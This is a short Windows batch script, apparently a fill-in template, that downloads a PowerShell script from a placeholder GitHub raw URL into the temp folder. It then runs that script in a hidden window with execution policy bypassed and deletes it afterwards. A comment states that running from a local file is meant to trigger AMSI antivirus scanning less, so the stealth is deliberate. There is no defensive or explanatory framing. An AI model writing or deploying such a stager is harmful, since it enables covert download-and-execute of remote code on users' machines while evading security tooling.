@echo off
setlocal EnableDelayedExpansion

:: === CONFIG - CHANGE THESE ===
set "PS_URL=https://raw.githubusercontent.com/yourusername/yourrepo/main/install.ps1"
set "TEMP_PS=%TEMP%\i.ps1"

:: Force TLS 1.2 (helps on older Win10)
powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"

:: Download the PS script silently to temp
powershell -nop -c "irm -UseBasicParsing '%PS_URL%' -OutFile '%TEMP_PS%'"

:: Run it hidden + bypass policy (local file = less AMSI trigger)
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP_PS%"

:: Optional: clean up the temp file
del /f /q "%TEMP_PS%" >nul 2>&1

endlocal
exit
